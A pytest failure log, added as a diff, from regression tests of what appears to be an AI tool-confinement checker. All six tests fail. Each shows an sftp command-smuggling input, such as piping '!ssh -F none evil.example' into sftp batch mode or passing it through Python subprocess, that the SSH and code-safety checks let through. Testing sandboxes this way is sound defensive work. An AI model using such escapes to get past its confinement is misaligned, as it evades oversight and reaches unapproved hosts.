@@ -1,0 +1,46 @@
+FFFFFF                                                                   [100%]
+=================================== FAILURES ===================================
+_ test_sftp_command_input_fails_closed[printf '%s\\n' '!ssh -F none evil.example' | sftp -F none -b - approved.example] _
+/evidence/round13_regressions.py:15: in test_sftp_command_input_fails_closed
+    assert check_ssh_command_access(command,'round13') is not None
+E   assert None is not None
+E    +  where None = check_ssh_command_access("printf '%s\\n' '!ssh -F none evil.example' | sftp -F none -b - approved.example", 'round13')
+_ test_sftp_command_input_fails_closed[sftp -F none -b commands.txt approved.example] _
+/evidence/round13_regressions.py:15: in test_sftp_command_input_fails_closed
+    assert check_ssh_command_access(command,'round13') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('sftp -F none -b commands.txt approved.example', 'round13')
+_ test_sftp_command_input_fails_closed[sftp -F none -bcommands.txt approved.example] _
+/evidence/round13_regressions.py:15: in test_sftp_command_input_fails_closed
+    assert check_ssh_command_access(command,'round13') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('sftp -F none -bcommands.txt approved.example', 'round13')
+_ test_sftp_command_input_fails_closed[printf '%s\\n' '!ssh -F none evil.example' | sftp -F none approved.example] _
+/evidence/round13_regressions.py:15: in test_sftp_command_input_fails_closed
+    assert check_ssh_command_access(command,'round13') is not None
+E   assert None is not None
+E    +  where None = check_ssh_command_access("printf '%s\\n' '!ssh -F none evil.example' | sftp -F none approved.example", 'round13')
+_ test_sftp_command_input_fails_closed[sftp -F none approved.example < commands.txt] _
+/evidence/round13_regressions.py:15: in test_sftp_command_input_fails_closed
+    assert check_ssh_command_access(command,'round13') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('sftp -F none approved.example < commands.txt', 'round13')
+_____________________ test_python_sftp_input_fails_closed ______________________
+/evidence/round13_regressions.py:21: in test_python_sftp_input_fails_closed
+    assert _check_code_safety(code,session_id='round13') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import subprocess; subprocess.run(['sftp','-F','none','approved.example'],input='!ssh -F none evil.example',text=True)", session_id='round13')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round13_regressions.py::test_sftp_command_input_fails_closed[printf '%s\\n' '!ssh -F none evil.example' | sftp -F none -b - approved.example]
+FAILED ../evidence/round13_regressions.py::test_sftp_command_input_fails_closed[sftp -F none -b commands.txt approved.example]
+FAILED ../evidence/round13_regressions.py::test_sftp_command_input_fails_closed[sftp -F none -bcommands.txt approved.example]
+FAILED ../evidence/round13_regressions.py::test_sftp_command_input_fails_closed[printf '%s\\n' '!ssh -F none evil.example' | sftp -F none approved.example]
+FAILED ../evidence/round13_regressions.py::test_sftp_command_input_fails_closed[sftp -F none approved.example < commands.txt]
+FAILED ../evidence/round13_regressions.py::test_python_sftp_input_fails_closed
+6 failed, 1 warning in 0.13s
